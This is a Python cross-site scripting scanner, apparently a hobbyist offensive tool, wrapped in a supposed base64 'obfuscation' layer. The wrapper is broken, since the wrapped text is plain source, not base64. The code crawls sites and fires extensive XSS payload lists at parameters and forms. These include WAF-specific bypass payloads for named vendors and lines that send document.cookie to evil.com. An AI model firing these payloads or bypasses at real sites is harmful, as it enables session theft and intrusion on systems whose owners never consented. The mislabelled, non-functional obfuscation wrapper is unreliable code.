#!/usr/bin/env python3
# Obfuscated with custom obfuscator
import base64
exec(base64.b64decode('#!/usr/bin/env python3
"""
Advanced XSS Scanner Tool
Similar to xsser tool - Cross Site Scripting vulnerability scanner
"""

import requests
import urllib.parse
import re
import argparse
import time
import random
import json
import html
import base64
import subprocess
import os
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, unquote
import threading
from concurrent.futures import ThreadPoolExecutor
import sys
from colorama import Fore, Back, Style, init
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Initialize colorama for colored output
init(autoreset=True)

class XSSScanner:
    def __init__(self, target_url, threads=10, delay=0, verbose=False, user_agent=None, output_file=None, browser_verify=True):
        self.target_url = target_url
        self.threads = threads
        self.delay = delay
        self.verbose = verbose
        self.session = requests.Session()
        self.vulnerabilities = []
        self.tested_urls = set()
        self.output_file = output_file or f"xss_scan_results_{int(time.time())}.json"
        self.browser_verify = browser_verify
        self.detected_waf = None
        
        # Set user agent
        if user_agent:
            self.session.headers.update({'User-Agent': user_agent})
        else:
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
        
        # Initialize browser for verification
        if self.browser_verify:
            self.init_browser()
        
        # WAF-specific bypass payloads
        self.waf_bypass_payloads = {
            'Cloudflare': [
                '<svg/onload=alert(1)>',
                '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />',
                '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
                'javascript:/*</title></style></textarea></script></xmp><svg/onload=\'/**/alert(1)\'>'
            ],
            'Akamai': [
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<object data="data:text/html,<script>alert(1)</script>">',
                'javascript:alert(String.fromCharCode(88,83,83))'
            ],
            'ModSecurity': [
                '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
                '<script>Function`alert\\u00281\\u0029```</script>',
                '<svg><script>alert&#40;1&#41;</script></svg>',
                'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>'
            ],
            'AWS WAF': [
                '<iframe src="javascript:alert`1`">',
                '<svg onload="[].forEach.call([],alert,1)">',
                '<script>setTimeout(alert,0,1)</script>',
                '<img src=x onerror="[].constructor.constructor(\'alert(1)\')();">'
            ],
            'Imperva (Incapsula)': [
                '<script>alert(String["fromCharCode"](49))</script>',
                '<img src=x onerror=alert(String.fromCharCode(49))>',
                '<svg onload=alert(/1/.source)>',
                '<script>${alert`1`}</script>'
            ]
        }
        
        # Enhanced comprehensive XSS payloads
        self.payloads = [
            # Basic payloads
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert("XSS")>',
            '<div onmouseover=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            
            # Advanced payloads
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src="x" onerror="alert(\'XSS\')" />',
            '<svg/onload=alert(/XSS/)>',
            '<iframe src=javascript:alert(1)>',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            
            # Filter bypass payloads
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<IMG SRC=javascript:alert("XSS")>',
            '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
            '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
            '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
            '<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycpOw=="))>',
            '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
            
            # Context-specific payloads
            'javascript:alert("XSS")',
            'vbscript:msgbox("XSS")',
            'onload="alert(\'XSS\')"',
            'onfocus="alert(\'XSS\')"',
            'onmouseover="alert(\'XSS\')"',
            'onclick="alert(\'XSS\')"',
            'onsubmit="alert(\'XSS\')"',
            
            # DOM-based payloads
            '#<script>alert("XSS")</script>',
            'javascript:void(alert("XSS"))',
            '<script>document.write("<img src=x onerror=alert(1)>")</script>',
            
            # Event handler payloads
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',
            '<video><source onerror="alert(\'XSS\')" src="">',
            '<audio src=x onerror=alert("XSS")>',
            
            # Advanced evasion
            '<script>alert`XSS`</script>',
            '<script>alert(String["fromCharCode"](88,83,83))</script>',
            '<img src="x" onerror=alert(String.fromCharCode(88,83,83))>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
            
            # Template literals
            '<script>${alert`XSS`}</script>',
            '<script>setTimeout`alert\\x28document.domain\\x29`</script>',
            '<script>Function`alert\\x28\\x29```</script>',
            
            # Unicode payloads
            '<script>\\u0061\\u006C\\u0065\\u0072\\u0074("XSS")</script>',
            '<script>alert\\u0028"XSS"\\u0029</script>',
            '<script>\\x61\\x6c\\x65\\x72\\x74("XSS")</script>',
            
            # HTML5 payloads
            '<form><button formaction="javascript:alert(\'XSS\')" formmethod="post">',
            '<math><mi//xlink:href="data:x,<script>alert(\'XSS\')</script>">',
            '<svg><a><animate attributeName=href values=javascript:alert(\'XSS\') /><text x=20 y=20>Click</text></a>',
            
            # CSS injection payloads
            '<style>@import"javascript:alert(\'XSS\')";</style>',
            '<style>body{background:url(javascript:alert(\'XSS\'))}</style>',
            '<link rel="stylesheet" href="javascript:alert(\'XSS\');">',
            
            # Meta tag payloads
            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\');">',
            '<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" />+ADw-script+AD4-alert(\'XSS\');+ADw-+AC8-script+AD4-',
            
            # Additional modern payloads
            '<img src="x" onerror="fetch(\'//evil.com/\'+document.cookie)">',
            '<svg onload="new Image().src=\'//evil.com/\'+document.cookie">',
            '<script>navigator.sendBeacon(\'//evil.com\',document.cookie)</script>',
            '<iframe srcdoc="<img src=x onerror=alert(\'XSS\')>">',
            '<form action="javascript:alert(\'XSS\')" method="get"><input type="submit">',
            
            # XML/XHTML payloads
            '<![CDATA[<script>alert(\'XSS\')</script>]]>',
            '<?xml version="1.0"?><root><![CDATA[<script>alert(\'XSS\')</script>]]></root>',
            
            # Polyglot payloads
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(\'XSS\')//\'>', 
            '"><svg><script>alert(String.fromCharCode(88,83,83))</script></svg>',
            '\'><svg><script>alert(String.fromCharCode(88,83,83))</script></svg>',
        ]
    
    def init_browser(self):
        """Initialize browser for verification"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            self.driver = webdriver.Chrome(options=chrome_options)
            self.log("Browser initialized for verification", "SUCCESS")
        except Exception as e:
            self.log(f"Failed to initialize browser: {str(e)}", "WARNING")
            self.browser_verify = False
            self.driver = None
    
    def verify_xss_in_browser(self, url, payload):
        """Verify XSS execution in browser"""
        if not self.browser_verify or not self.driver:
            return False
        
        try:
            self.driver.get(url)
            
            # Set up alert detection
            self.driver.execute_script("""
                window.alertTriggered = false;
                window.originalAlert = window.alert;
                window.alert = function(msg) {
                    window.alertTriggered = true;
                    window.alertMessage = msg;
                };
            """)
            
            # Wait for potential alert
            time.sleep(2)
            
            # Check if alert was triggered
            alert_triggered = self.driver.execute_script("return window.alertTriggered;")
            
            return alert_triggered
            
        except Exception as e:
            self.log(f"Browser verification error: {str(e)}", "ERROR")
            return False
    
    def get_waf_bypass_payloads(self, waf_name):
        """Get WAF-specific bypass payloads"""
        if waf_name in self.waf_bypass_payloads:
            return self.waf_bypass_payloads[waf_name]
        return []

    def log(self, message, level="INFO"):
        """Logging function with colored output"""
        timestamp = time.strftime("%H:%M:%S")
        if level == "INFO":
            color = Fore.CYAN
        elif level == "SUCCESS":
            color = Fore.GREEN
        elif level == "WARNING":
            color = Fore.YELLOW
        elif level == "ERROR":
            color = Fore.RED
        elif level == "VULN":
            color = Fore.RED + Back.YELLOW
        else:
            color = Fore.WHITE
            
        if self.verbose or level in ["SUCCESS", "VULN", "ERROR"]:
            print(f"{color}[{timestamp}] [{level}] {message}")

    def get_forms(self, url):
        """Extract all forms from a webpage"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {
                    'action': form.get('action'),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_details = {
                        'name': input_tag.get('name'),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    form_details['inputs'].append(input_details)
                
                forms.append(form_details)
            
            return forms
        except Exception as e:
            self.log(f"Error getting forms from {url}: {str(e)}", "ERROR")
            return []

    def get_url_parameters(self, url):
        """Extract URL parameters with enhanced detection"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        # Convert to simple dict
        param_dict = {key: value[0] if value else '' for key, value in params.items()}
        
        # If no parameters found, try to discover potential injection points
        if not param_dict:
            self.log("No URL parameters found, checking for potential injection points...", "INFO")
            param_dict = self.discover_potential_parameters(url)
        
        return param_dict
    
    def discover_potential_parameters(self, url):
        """Discover potential parameters from common patterns"""
        potential_params = {}
        
        # Common parameter names to test
        common_params = [
            'id', 'page', 'search', 'q', 'query', 'name', 'user', 'cat', 'category',
            'type', 'action', 'view', 'file', 'path', 'url', 'redirect', 'next',
            'callback', 'return', 'goto', 'target', 'data', 'value', 'input',
            'term', 'keyword', 'filter', 'sort', 'order', 'limit', 'offset'
        ]
        
        # Test if URL accepts parameters by adding test parameter
        base_url = url.rstrip('/')
        
        for param in common_params:
            test_url = f"{base_url}?{param}=test"
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    # Check if the parameter might be processed
                    if 'test' in response.text or param in response.text:
                        potential_params[param] = 'test'
                        self.log(f"Discovered potential parameter: {param}", "INFO")
            except:
                continue
        
        return potential_params

    def detect_waf(self, url):
        """Detect WAF present on the target URL"""
        waf_indicators = {
            "Cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
            "Akamai": ["akamai", "akamai-ghost"],
            "Imperva (Incapsula)": ["incapsula", "imperva", "x-iinfo"],
            "Sucuri": ["sucuri", "x-sucuri-id"],
            "F5 BIG-IP": ["f5", "bigip", "x-waf-event"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "AWS WAF": ["awswaf", "x-amzn-requestid"],
            "Barracuda": ["barracuda", "barra"],
            "Fortinet": ["fortinet", "fortigate"]
        }

        try:
            response = self.session.get(url, timeout=5)
            headers = response.headers
            content = response.text.lower()
            
            for waf_name, indicators in waf_indicators.items():
                for indicator in indicators:
                    # Check headers
                    for header_name, header_value in headers.items():
                        if indicator.lower() in header_name.lower() or indicator.lower() in header_value.lower():
                            return waf_name
                    # Check content
                    if indicator in content:
                        return waf_name
        except:
            return None

        return None

    def encode_payload(self, payload, encoding_type='none'):
        """Encode payload with different encoding methods"""
        if encoding_type == 'url':
            return quote(payload, safe='')
        elif encoding_type == 'double_url':
            return quote(quote(payload, safe=''), safe='')
        elif encoding_type == 'html':
            return html.escape(payload)
        elif encoding_type == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == 'hex':
            return ''.join(f'%{ord(c):02x}' for c in payload)
        elif encoding_type == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        else:
            return payload
    
    def test_reflection(self, url, method='GET', data=None, param_name=None):
        """Test if payload is reflected in response with enhanced detection"""
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, timeout=10)
            else:
                response = self.session.post(url, data=data, timeout=10)
            
            return response.text, response.status_code, response.headers.get('content-type', '')
        except Exception as e:
            self.log(f"Error testing reflection: {str(e)}", "ERROR")
            return "", 0, ""

    def test_xss_in_url(self, url):
        """Test XSS in URL parameters with multiple payloads and encodings"""
        params = self.get_url_parameters(url)
        if not params:
            return
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        for param_name in params.keys():
            self.log(f"Testing URL parameter: {param_name}", "INFO")
            
            # Test all payloads for this parameter
            for original_payload in self.payloads:
                unique_id = f"XSS{random.randint(1000, 9999)}"
                test_payload = original_payload.replace('XSS', unique_id).replace('alert("XSS")', f'alert("{unique_id}")')
                
                # Test with different encodings
                encodings = ['none', 'url', 'double_url', 'html']
                
                for encoding in encodings:
                    encoded_payload = self.encode_payload(test_payload, encoding)
                    test_params = params.copy()
                    test_params[param_name] = encoded_payload
                    
                    test_url = f"{base_url}?{urlencode(test_params)}"
                    
                    response_text, status_code, content_type = self.test_reflection(test_url)
                    
                    # Enhanced reflection detection
                    if status_code == 200 and self.is_xss_reflected(response_text, unique_id, content_type):
                            
                            # Browser verification
                            is_verified = False
                            if self.browser_verify:
                                is_verified = self.verify_xss_in_browser(test_url, test_payload)
                            
                            if is_verified or not self.browser_verify:
                                vuln = {
                                    'type': 'Reflected XSS',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': original_payload,
                                    'encoded_payload': encoded_payload,
                                    'encoding': encoding,
                                    'method': 'GET',
                                    'unique_id': unique_id,
                                    'content_type': content_type,
                                    'verified_in_browser': is_verified
                                }
                                self.vulnerabilities.append(vuln)
                                self.log(f"VULNERABILITY FOUND! Parameter: {param_name}, Encoding: {encoding}, Payload: {original_payload[:50]}...", "VULN")
                                if is_verified:
                                    self.log("Payload execution VERIFIED in browser!", "SUCCESS")
                                break  # Found working payload, move to next payload
                    
                    if self.delay:
                        time.sleep(self.delay)

    def is_xss_reflected(self, response_text, unique_id, content_type):
        """Enhanced XSS reflection detection to avoid false positives"""
        if unique_id not in response_text:
            return False
        
        # Check if it's in a context where XSS would execute
        dangerous_contexts = [
            f'<script>{unique_id}',
            f'<script>alert("{unique_id}")',
            f'onerror=alert("{unique_id}")',
            f'onload=alert("{unique_id}")',
            f'javascript:alert("{unique_id}")',
            f'<svg onload=alert("{unique_id}")',
            f'<img src=x onerror=alert("{unique_id}")',
            f'<body onload=alert("{unique_id}")',
            f'<iframe src="javascript:alert("{unique_id}")',
        ]
        
        # Check for dangerous contexts
        for context in dangerous_contexts:
            if context in response_text:
                return True
        
        # Check if reflected in HTML content (not just plain text)
        if 'text/html' in content_type.lower():
            # Look for HTML tags containing the unique_id
            html_pattern = f'<[^>]*{re.escape(unique_id)}[^>]*>'
            if re.search(html_pattern, response_text, re.IGNORECASE):
                return True
        
        # Additional check for script context
        script_pattern = f'<script[^>]*>[^<]*{re.escape(unique_id)}[^<]*</script>'
        if re.search(script_pattern, response_text, re.IGNORECASE):
            return True
        
        return False
    
    def test_xss_in_forms(self, url):
        """Test XSS in form inputs with multiple payloads and encodings"""
        forms = self.get_forms(url)
        
        for form in forms:
            action = form['action']
            method = form['method']
            
            if action:
                if action.startswith('/'):
                    action_url = urljoin(url, action)
                elif action.startswith('http'):
                    action_url = action
                else:
                    action_url = urljoin(url, action)
            else:
                action_url = url
            
            self.log(f"Testing form: {action_url} ({method.upper()})", "INFO")
            
            for input_field in form['inputs']:
                input_name = input_field['name']
                if not input_name:
                    continue
                
                self.log(f"Testing form input: {input_name}", "INFO")
                
                # Test all payloads for this input
                for original_payload in self.payloads:
                    unique_id = f"XSS{random.randint(1000, 9999)}"
                    test_payload = original_payload.replace('XSS', unique_id).replace('alert("XSS")', f'alert("{unique_id}")')
                    
                    # Test with different encodings
                    encodings = ['none', 'url', 'double_url', 'html']
                    
                    for encoding in encodings:
                        encoded_payload = self.encode_payload(test_payload, encoding)
                        form_data = {}
                        
                        # Fill form with default values
                        for field in form['inputs']:
                            if field['name']:
                                if field['name'] == input_name:
                                    form_data[field['name']] = encoded_payload
                                else:
                                    form_data[field['name']] = field['value'] or 'test'
                        
                        response_text, status_code, content_type = self.test_reflection(action_url, method, form_data, input_name)
                        
                        # Enhanced reflection detection
                        if status_code == 200 and self.is_xss_reflected(response_text, unique_id, content_type):

                            # Browser verification
                            is_verified = False
                            if self.browser_verify:
                                is_verified = self.verify_xss_in_browser(action_url, form_data)

                            if is_verified or not self.browser_verify:
                                vuln = {
                                    'type': 'Reflected XSS',
                                    'url': action_url,
                                    'parameter': input_name,
                                    'payload': original_payload,
                                    'encoded_payload': encoded_payload,
                                    'encoding': encoding,
                                    'method': method.upper(),
                                    'unique_id': unique_id,
                                    'content_type': content_type,
                                    'verified_in_browser': is_verified
                                }
                                self.vulnerabilities.append(vuln)
                                self.log(f"VULNERABILITY FOUND! Form input: {input_name}, Encoding: {encoding}, Payload: {original_payload[:50]}...", "VULN")
                                if is_verified:
                                    self.log("Payload execution VERIFIED in browser!", "SUCCESS")
                                break  # Found working payload, move to next payload
                        
                        if self.delay:
                            time.sleep(self.delay)

    def crawl_links(self, url, max_depth=2, current_depth=0):
        """Crawl website to find more URLs to test"""
        if current_depth >= max_depth or url in self.tested_urls:
            return []
        
        self.tested_urls.add(url)
        links = [url]
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(url, href)
                
                # Only crawl same domain
                if urlparse(full_url).netloc == urlparse(url).netloc:
                    if full_url not in self.tested_urls:
                        links.extend(self.crawl_links(full_url, max_depth, current_depth + 1))
        
        except Exception as e:
            self.log(f"Error crawling {url}: {str(e)}", "ERROR")
        
        return links

    def test_dom_xss(self, url):
        """Test for DOM-based XSS vulnerabilities"""
        dom_payloads = [
            '#<script>alert("DOM_XSS")</script>',
            '#"><script>alert("DOM_XSS")</script>',
            '#javascript:alert("DOM_XSS")',
            '#<img src=x onerror=alert("DOM_XSS")>',
        ]
        
        for payload in dom_payloads:
            test_url = url + payload
            try:
                response = self.session.get(test_url, timeout=10)
                if "DOM_XSS" in response.text:
                    vuln = {
                        'type': 'DOM XSS',
                        'url': test_url,
                        'parameter': 'URL Fragment',
                        'payload': payload,
                        'method': 'GET'
                    }
                    self.vulnerabilities.append(vuln)
                    self.log(f"DOM XSS VULNERABILITY FOUND! Payload: {payload}", "VULN")
            except Exception as e:
                self.log(f"Error testing DOM XSS: {str(e)}", "ERROR")

    def scan_single_url(self, url):
        """Scan a single URL for XSS vulnerabilities with WAF awareness"""
        self.log(f"Scanning URL: {url}", "INFO")
        
        # Detect WAF at the beginning of scan
        if not self.detected_waf:
            self.detected_waf = self.detect_waf(url)
            if self.detected_waf:
                self.log(f"WAF Detected: {self.detected_waf}", "WARNING")
                # Prepend WAF-specific bypass payloads
                bypass_payloads = self.get_waf_bypass_payloads(self.detected_waf)
                if bypass_payloads:
                    self.log(f"Loading {len(bypass_payloads)} bypass payloads for {self.detected_waf}", "INFO")
                    self.payloads = bypass_payloads + self.payloads
        
        # Test URL parameters
        self.test_xss_in_url(url)
        
        # Test forms
        self.test_xss_in_forms(url)
        
        # Test DOM XSS
        self.test_dom_xss(url)

    def scan(self, crawl=False, max_depth=2):
        """Main scanning function"""
        self.log("Starting XSS scan...", "INFO")
        
        urls_to_test = [self.target_url]
        
        if crawl:
            self.log("Crawling website for additional URLs...", "INFO")
            urls_to_test = self.crawl_links(self.target_url, max_depth)
            self.log(f"Found {len(urls_to_test)} URLs to test", "INFO")
        
        # Use threading for faster scanning
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.scan_single_url, urls_to_test)
        
        self.generate_report()

    def generate_report(self):
        """Generate comprehensive scan report"""
        print("\n" + "="*60)
        print(f"{Fore.MAGENTA}XSS SCAN REPORT - Crafted by H4mzaX")
        print("="*60)
        
        # Detect WAF if available
        waf_details = self.detect_waf(self.target_url)
        if waf_details:
            print(f"{Fore.YELLOW}WAF Detected: {waf_details}{Style.RESET_ALL}")
        
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}No XSS vulnerabilities found.")
        else:
            print(f"{Fore.RED}Found {len(self.vulnerabilities)} XSS vulnerabilities:")
            print()
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{Fore.RED}[{i}] {vuln['type']}")
                print(f"    URL: {vuln['url']}")
                print(f"    Parameter: {vuln['parameter']}")
                print(f"    Method: {vuln['method']}")
                print(f"    Payload: {vuln['payload']}")
                if 'encoding' in vuln:
                    print(f"    Encoding: {vuln['encoding']}")
                if 'content_type' in vuln:
                    print(f"    Content-Type: {vuln['content_type']}")
                print()
        
        # Save comprehensive report to single JSON file
        report_data = {
            'scan_info': {
                'target_url': self.target_url,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulnerabilities': len(self.vulnerabilities),
                'scan_settings': {
                    'threads': self.threads,
                    'delay': self.delay,
                    'total_payloads_tested': len(self.payloads)
                }
            },
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(self.output_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        print(f"Comprehensive report saved to: {self.output_file}")

def scan_from_file(args):
    """ Scan URLs from a txt file and save all results to one file """
    try:
        with open(args.list, 'r') as file:
            urls = file.readlines()
        
        all_vulnerabilities = []
        output_file = args.output or f"xss_scan_results_batch_{int(time.time())}.json"
        
        for url in urls:
            url = url.strip()
            if url:
                print(f"Starting scan for: {url}")
                scanner = XSSScanner(
                    target_url=url,
                    threads=args.threads,
                    delay=args.delay,
                    verbose=args.verbose,
                    user_agent=args.user_agent,
                    output_file=output_file,
                    browser_verify=args.browser_verify
                )
                scanner.scan(crawl=args.crawl, max_depth=args.max_depth)
                
                # Collect vulnerabilities for batch report
                all_vulnerabilities.extend(scanner.vulnerabilities)
        
        # Generate combined report
        combined_report = {
            'scan_info': {
                'batch_scan': True,
                'total_urls_scanned': len([u.strip() for u in urls if u.strip()]),
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulnerabilities': len(all_vulnerabilities)
            },
            'vulnerabilities': all_vulnerabilities
        }
        
        with open(output_file, 'w') as f:
            json.dump(combined_report, f, indent=2)
        
        print(f"\n{Fore.GREEN}Batch scan completed! Combined results saved to: {output_file}")

    except FileNotFoundError:
        print(f"{Fore.RED}Error: File '{args.list}' not found!{Fore.RESET}")


def main():
    import subprocess
    figlet_banner = subprocess.getoutput("figlet 'XSS Tool by H4mzaX'")
    # Display banner with lolcat for colorfulness
    subprocess.run(f'echo "{figlet_banner}" | lolcat', shell=True)

    banner = f"""
{Fore.MAGENTA}
Advanced XSS Vulnerability Hunter - Custom Edition
{Fore.YELLOW}Developed by H4mzaX
{Fore.GREEN}Features: Auto WAF Detection | Advanced Techniques | Creative Output
{Style.RESET_ALL}

"""
    print(banner)
    
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner')
    parser.add_argument('-u', '--url', help='Target URL to scan')
    parser.add_argument('-l', '--list', help='File containing list of URLs to scan (one per line)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay between requests in seconds')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-c', '--crawl', action='store_true', help='Crawl website for additional URLs')
    parser.add_argument('--max-depth', type=int, default=2, help='Maximum crawl depth (default: 2)')
    parser.add_argument('--user-agent', help='Custom User-Agent string')
    parser.add_argument('-o', '--output', help='Output file for results (default: auto-generated)')
    parser.add_argument('--no-browser-verify', action='store_false', dest='browser_verify', help='Disable browser-based verification')
    
    args = parser.parse_args()
    
    # Validate input - either URL or list file required
    if not args.url and not args.list:
        parser.error("Either -u/--url or -l/--list is required")
    
    if args.url and args.list:
        parser.error("Cannot use both -u/--url and -l/--list at the same time")
    
    try:
        if args.list:
            # Scan multiple URLs from file
            scan_from_file(args)
        else:
            # Scan single URL
            scanner = XSSScanner(
                target_url=args.url,
                threads=args.threads,
                delay=args.delay,
                verbose=args.verbose,
                user_agent=args.user_agent,
                output_file=args.output,
                browser_verify=args.browser_verify
            )
            
            scanner.scan(crawl=args.crawl, max_depth=args.max_depth)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
').decode('utf-8'))
